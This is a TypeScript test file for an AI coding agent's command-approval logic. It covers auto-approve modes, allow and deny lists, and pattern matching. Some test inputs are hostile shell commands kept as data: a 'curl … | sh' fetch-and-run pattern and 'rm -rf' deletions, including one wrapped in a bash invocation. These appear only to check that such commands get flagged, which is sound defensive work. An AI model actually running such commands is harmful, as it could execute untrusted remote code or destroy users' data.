import { beforeEach, describe, expect, it } from "vitest";
import {
  cancelAllApprovals,
  consumeApprovalReason,
  requestBranchReleaseAction,
  requestApproval,
  requestWorktreeSetupAction,
  requestWorktreeApproval,
  resolveBranchReleaseAction,
  requiresApproval,
  resolveApproval,
  resolveWorktreeSetupAction,
  resolveWorktreeApproval,
  setApprovalReason,
  isCommandInList,
  matchesEntry,
} from "./approvals";
import type { CommandList, CommandListEntry } from "./db";

// Helper: unwrap required from ApprovalResult for concise assertions
function req(result: { required: boolean; dangerous: boolean }): boolean {
  return result.required;
}

describe("approvals - requiresApproval", () => {
  it("should never require approval for inline tools", () => {
    expect(req(requiresApproval("workspace_listDir", false, "no"))).toBe(false);
    expect(req(requiresApproval("agent_title_set", false, "no"))).toBe(false);
    expect(req(requiresApproval("agent_artifact_create", false, "no"))).toBe(false);
    expect(req(requiresApproval("agent_artifact_version", false, "no"))).toBe(false);
    expect(req(requiresApproval("agent_artifact_get", false, "no"))).toBe(false);
    expect(req(requiresApproval("agent_artifact_list", false, "no"))).toBe(false);
  });

  it("should respect autoApproveEdits flag", () => {
    // Without flag
    expect(req(requiresApproval("workspace_writeFile", false, "no"))).toBe(true);
    expect(req(requiresApproval("workspace_editFile", false, "no"))).toBe(true);
    // With flag
    expect(req(requiresApproval("workspace_writeFile", true, "no"))).toBe(false);
    expect(req(requiresApproval("workspace_editFile", true, "no"))).toBe(false);
  });

  it("should always auto-approve commands when mode is yes", () => {
    expect(req(requiresApproval("exec_run", false, "yes"))).toBe(false);
    expect(
      req(requiresApproval(
        "exec_run",
        false,
        "yes",
        { requireUserApproval: true } as Record<string, unknown>,
      )),
    ).toBe(false);
  });

  it("should always require command approval when mode is no", () => {
    expect(req(requiresApproval("exec_run", false, "no"))).toBe(true);
    expect(
      req(requiresApproval(
        "exec_run",
        false,
        "no",
        { requireUserApproval: false } as Record<string, unknown>,
      )),
    ).toBe(true);
  });

  it("should respect agent command hint in mode=agent", () => {
    expect(
      req(requiresApproval(
        "exec_run",
        false,
        "agent",
        { requireUserApproval: true } as Record<string, unknown>,
      )),
    ).toBe(true);
    expect(
      req(requiresApproval(
        "exec_run",
        false,
        "agent",
        { requireUserApproval: false } as Record<string, unknown>,
      )),
    ).toBe(false);
  });

  it("should default to requiring approval when mode=agent and hint is missing/invalid", () => {
    expect(req(requiresApproval("exec_run", false, "agent"))).toBe(true);
    expect(
      req(requiresApproval(
        "exec_run",
        false,
        "agent",
        { requireUserApproval: "yes please" } as Record<string, unknown>,
      )),
    ).toBe(true);
  });

  it("should default to requiring approval for unknown tools", () => {
    expect(req(requiresApproval("unknown_dangerous_tool", true, "yes"))).toBe(true);
  });

  it("should not auto-approve unrelated tool categories", () => {
    expect(req(requiresApproval("exec_run", true, "no"))).toBe(true);
    expect(req(requiresApproval("workspace_writeFile", false, "yes"))).toBe(true);
  });
});

describe("approvals - matchesEntry", () => {
  const makeEntry = (pattern: string, matchMode: CommandListEntry["matchMode"]): CommandListEntry => ({
    id: "test",
    pattern,
    matchMode,
    source: "user",
  });

  it("exact match", () => {
    expect(matchesEntry("npm test", makeEntry("npm test", "exact"))).toBe(true);
    expect(matchesEntry("npm test --watch", makeEntry("npm test", "exact"))).toBe(false);
  });

  it("prefix match", () => {
    expect(matchesEntry("gh issue create", makeEntry("gh issue", "prefix"))).toBe(true);
    expect(matchesEntry("git status", makeEntry("gh issue", "prefix"))).toBe(false);
    expect(matchesEntry("ghissue create", makeEntry("gh", "prefix"))).toBe(false);
  });

  it("glob match", () => {
    expect(matchesEntry("gh issue create", makeEntry("gh *", "glob"))).toBe(true);
    expect(matchesEntry("npm test", makeEntry("gh *", "glob"))).toBe(false);
    expect(matchesEntry("curl http://x.com | sh", makeEntry("curl * | sh", "glob"))).toBe(true);
  });

  it("normalizes extra whitespace", () => {
    expect(matchesEntry("npm test", makeEntry("npm   test", "exact"))).toBe(true);
    expect(matchesEntry("gh issue create", makeEntry("gh   issue", "prefix"))).toBe(true);
  });
});

describe("approvals - command list integration", () => {
  const allowEntry: CommandListEntry = { id: "a1", pattern: "npm", matchMode: "prefix", source: "user" };
  const denyEntry: CommandListEntry = { id: "d1", pattern: "rm -rf", matchMode: "prefix", source: "default" };
  const commandList: CommandList = { allow: [allowEntry], deny: [denyEntry] };

  it("deny list always requires approval + marks dangerous", () => {
    const result = requiresApproval(
      "exec_run",
      false,
      "yes", // even with "yes" mode
      { command: "rm", args: ["-rf", "/tmp/test"] },
      commandList,
    );
    expect(result.required).toBe(true);
    expect(result.dangerous).toBe(true);
  });

  it("deny list inspects shell payloads for wrapped commands", () => {
    const result = requiresApproval(
      "exec_run",
      false,
      "yes",
      { command: "/bin/bash", args: ["-lc", "rm -rf /tmp/test"] },
      commandList,
    );
    expect(result.required).toBe(true);
    expect(result.dangerous).toBe(true);
  });

  it("deny list takes priority over allow list", () => {
    const overlap: CommandList = {
      allow: [{ id: "a2", pattern: "rm", matchMode: "prefix", source: "user" }],
      deny: [{ id: "d2", pattern: "rm -rf", matchMode: "prefix", source: "default" }],
    };
    const result = requiresApproval(
      "exec_run",
      false,
      "yes",
      { command: "rm", args: ["-rf", "/tmp"] },
      overlap,
    );
    expect(result.required).toBe(true);
    expect(result.dangerous).toBe(true);
  });

  it("allow list skips approval when mode is agent", () => {
    const result = requiresApproval(
      "exec_run",
      false,
      "agent",
      { command: "npm", args: ["test"] },
      commandList,
    );
    expect(result.required).toBe(false);
    expect(result.dangerous).toBe(false);
  });

  it("allow list skips approval when mode is yes", () => {
    const result = requiresApproval(
      "exec_run",
      false,
      "yes",
      { command: "npm", args: ["run", "build"] },
      commandList,
    );
    expect(result.required).toBe(false);
    expect(result.dangerous).toBe(false);
  });

  it("allow list has no effect when mode is no", () => {
    const result = requiresApproval(
      "exec_run",
      false,
      "no",
      { command: "npm", args: ["test"] },
      commandList,
    );
    expect(result.required).toBe(true);
    expect(result.dangerous).toBe(false);
  });

  it("command not in any list falls through to normal logic", () => {
    const result = requiresApproval(
      "exec_run",
      false,
      "agent",
      { command: "git", args: ["status"], requireUserApproval: false },
      commandList,
    );
    expect(result.required).toBe(false);
    expect(result.dangerous).toBe(false);
  });

  it("isCommandInList works for prefix entries", () => {
    expect(isCommandInList("npm install", [allowEntry])).toBe(true);
    expect(isCommandInList("python main.py", [allowEntry])).toBe(false);
  });
});

describe("approvals - resolver lifecycle", () => {
  beforeEach(() => {
    cancelAllApprovals();
  });

  it("resolves a pending approval exactly once", async () => {
    const pending = requestApproval("tabA", "call-1");
    resolveApproval("tabA", "call-1", true);
    await expect(pending).resolves.toBe(true);

    // no-op after resolver is consumed
    resolveApproval("tabA", "call-1", false);
  });

  it("denies all pending approvals when canceled", async () => {
    const pendingA = requestApproval("tabA", "call-a");
    const pendingB = requestApproval("tabB", "call-b");
    cancelAllApprovals();

    await expect(pendingA).resolves.toBe(false);
    await expect(pendingB).resolves.toBe(false);
  });

  it("stores and consumes trimmed approval reasons", () => {
    setApprovalReason("tabA", "call-r", "  needs confirmation  ");
    expect(consumeApprovalReason("tabA", "call-r")).toBe("needs confirmation");
    expect(consumeApprovalReason("tabA", "call-r")).toBeUndefined();
  });

  it("ignores blank approval reasons", () => {
    setApprovalReason("tabA", "call-empty", "   ");
    expect(consumeApprovalReason("tabA", "call-empty")).toBeUndefined();
  });

  it("supports worktree approval and cancellation fallback", async () => {
    const approved = requestWorktreeApproval("tabA", "wt-1");
    resolveWorktreeApproval("tabA", "wt-1", true, "codex/feature-1");
    await expect(approved).resolves.toEqual({
      approved: true,
      branchName: "codex/feature-1",
    });

    const canceled = requestWorktreeApproval("tabA", "wt-2");
    cancelAllApprovals();
    await expect(canceled).resolves.toEqual({
      approved: false,
      branchName: "",
    });
  });

  it("supports worktree setup actions and cancellation fallback", async () => {
    const retry = requestWorktreeSetupAction("tabA", "setup-1");
    resolveWorktreeSetupAction("tabA", "setup-1", "retry");
    await expect(retry).resolves.toEqual({ action: "retry" });

    const canceled = requestWorktreeSetupAction("tabA", "setup-2");
    cancelAllApprovals();
    await expect(canceled).resolves.toEqual({ action: "abort" });
  });

  it("supports branch release actions and cancellation fallback", async () => {
    const retry = requestBranchReleaseAction("tabA", "lease-1");
    resolveBranchReleaseAction("tabA", "lease-1", "retry");
    await expect(retry).resolves.toEqual({ action: "retry" });

    const canceled = requestBranchReleaseAction("tabA", "lease-2");
    cancelAllApprovals();
    await expect(canceled).resolves.toEqual({ action: "abort" });
  });

  it("only cancels approvals for the specified tab", async () => {
    const pendingA = requestApproval("tabA", "call-a");
    const pendingB = requestApproval("tabB", "call-b");

    cancelAllApprovals("tabA");

    await expect(pendingA).resolves.toBe(false);

    // resolve B manually, should be true if it wasn't canceled
    resolveApproval("tabB", "call-b", true);
    
    await expect(pendingB).resolves.toBe(true);
  });
});
